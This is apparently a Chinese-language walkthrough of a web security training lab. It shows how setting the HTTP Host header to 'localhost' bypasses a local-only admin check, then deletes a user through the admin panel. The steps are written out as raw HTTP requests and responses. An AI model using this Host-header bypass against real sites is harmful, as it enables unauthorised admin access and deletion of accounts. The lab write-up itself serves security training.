# 实验：Host 头认证绕过

本实验基于 HTTP Host 头对用户权限级别做出假设。

为了解决本实验，请访问管理员面板并删除用户 `carlos`。

## 步骤

探测
- 访问可能的管理员端点
    ```http
    GET /admin HTTP/2
    Host: id.web-security-academy.net
    ```

    - 服务器响应
        ```http
        HTTP/2 401 Unauthorized

        Admin interface only available to local users
        ```

尝试 Host 头攻击
- 任意修改 Host 头
    ```http
    GET /admin HTTP/2
    Host: foo
    ```
    - 服务器仍响应 401，请求成功发送到端点而未出现路由错误

- 修改为本机 host
    ```http
    GET /my-account HTTP/2
    Host: localhost
    ```
    - 响应 200，并返回管理员面板
        ```html
        <a href="/admin/delete?username=carlos">
            Delete
        </a>
        ```

- 访问删除功能端点
    ```http
    GET /admin/delete?username=carlos HTTP/2
    Host: localhost
    ```
